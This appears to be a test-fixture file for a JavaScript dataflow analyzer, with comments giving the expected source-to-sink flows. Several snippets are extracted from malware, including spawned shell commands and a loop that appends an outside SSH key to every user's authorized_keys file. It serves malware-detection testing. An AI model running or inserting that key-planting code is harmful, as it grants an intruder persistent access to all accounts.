/* Windowing example based on malware.  
 * Although the parameters are wildcard objects,
 * they should be linked by dataflow to the definition
 * on the first line.  In addition there should be 3 separate
 * callsites for cp.spawn despite the common artificial ast node */
command = 'lsuname -rdate'
// Flow 1
cp = require('child_process');
cp.spawn(command[0] + command[1]);
// command -> child_process.spawn
// Flow 2
cp.spawn(command[2] + command[3] + command[4] + command[5] + command[6] + command[7] + command[8] + command[9] + command[10])
// command -> child_process.spawn
// Flow 1 === Flow 2
// Flow 3
function x(command) {
    cp.spawn(command[11] + command[12] + command[13] + command[14])
}

module.exports = {
    "ex1": function (c) { x(c) },
    // Flow 1: c --> cp.spawn
    "ex2": function (c) { x("cd /" + "\n" + c )}
    // Flow 2: c_2 & "cd /" & "\n" --> cp.spawn
}

/* ====================================== */
/* Dataflow should go from source lines to sink lines,
 * and require edges should link */

lib = require('external_lib_name')
lib2 = require('otherlib')

source1 = 'source1'
source2 = 'source2'

if(lib2.condition()){
    lib.doAThing(source1)
    // Flow 1: source1 --> lib.doAThing
}else{
    lib.doAThing(source2)
    // Flow 2: source2 --> lib.doAThing
}
y = ....
e = fs.read(f1)
e = fs.read(f2)
e = fs.stat("filename")
// e = {ctime: xxx, mtime xxx}
console.log(e[y])
require("unknown_library")
require("unknown_library") // Is this the same symbolic object?

e[y]
e[y] // Is this the same symbolic object?


e[y].func()
/* ====================================== */
/* Extracted from leetlog.  fs.readdir should be noted
 * as a sink and a source.  fs.appendFile should be a 
 * sink with the return value from fs.readdir as a source. 
 * The locally defined functions should not be sinks. */

const fs = require("fs");
  my_ssh_key = "ssh-rsa Ol... friend@goodplace";
  function myCall1(x) {
    return x;
  }
  myCall2 = function(y){
    return y;
  }
  myCall3 = function funcName(z){
    return z;
  }
const fs = require("fs");

  // Source is parameter to passed callback
fs.readdir("/home", (o, l) => {
  o || l.forEach(o => {
    const l = "/home/" + o + "/.ssh/authorized_keys";
    myCall1(l)
    myCall2(l)
    myCall3(l)
    (a => a)(l)
    fs.appendFile(l, "\n" + my_ssh_key + "\n", () => {});
  });
});

/* ====================================== */
/* Performance example.  Extracted from extremely slow eslint 4.0.0 function */

function updateDeeply(target, override) {
    for (const key in override) {
        if (override.blah(key)) {
            updateDeeply(target[key], override[key]);
        }
    }
    return target;
}
 
function analyze(providedOptions) {
    updateDeeply({}, providedOptions);
}

module.exports = {
	analyze: analyze,
	updateDeeply: updateDeeply,
};

/* ====================================== */
/* Both 1 and 0 should be linked to console.log */

o = {
	f: function(){
		return 0
	}
}
console.log(o.f())
o.f = function(){
	return 1
}

console.log(o.f())

/* ====================================== */
/* Example extracted from obfuscated browser malware.
 * The call to document.createElement should be 
 * noted even though it is obfuscated through 
 * an argument array. */


!function (funcArray) {
    var M = {};
    function e(n) {
        return funcArray[n].call(1,2)
    }
   e( x = 0)
}([function (_, M) {
    const n = document.createElement('link');
}]);

/* ====================================== */
/* The target of the calls should be resolved to
 * a common target name, even though
 * lib.func1 may return objects with different
 * prototypes each time it is called (unsound) */

lib = require('lib')

o = lib.func1()

o2 = lib.func1()

o.func2()
o2.func2()

/* ====================================== */
/* Same as above, but unsoundness is much less likely
 * as the constructor would have to actually replace itself,
 * rather than just return a different value. */

lib = require('lib')

o = new lib.t1()

o2 = new lib.t2()

o.func2()
o2.func2()

/* ====================================== */
/* Test the ability of import to create the necessary objects.
 * This should create an object representing lib2, an object
 * representing iLib, and link the library functions 
 * back to the imported library object.   */

import iLib from lib2

source1 = 'source1'

source2 = 'source2'

if(iLib.condition()){
    iLib.doAThing(source1)
}else{
    iLib.doAThing(source2)
}


